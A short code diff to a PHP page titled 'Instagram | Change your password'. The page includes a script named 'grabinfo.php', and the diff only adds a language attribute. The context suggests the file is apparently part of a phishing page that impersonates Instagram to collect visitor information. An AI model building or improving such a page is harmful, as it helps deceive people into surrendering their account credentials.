@@ -2,7 +2,7 @@
 include 'grabinfo.php';
 ?>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
         <title>Instagram | Change your password</title>
         <link rel="stylesheet" type="text/css" href="sttyle.css">
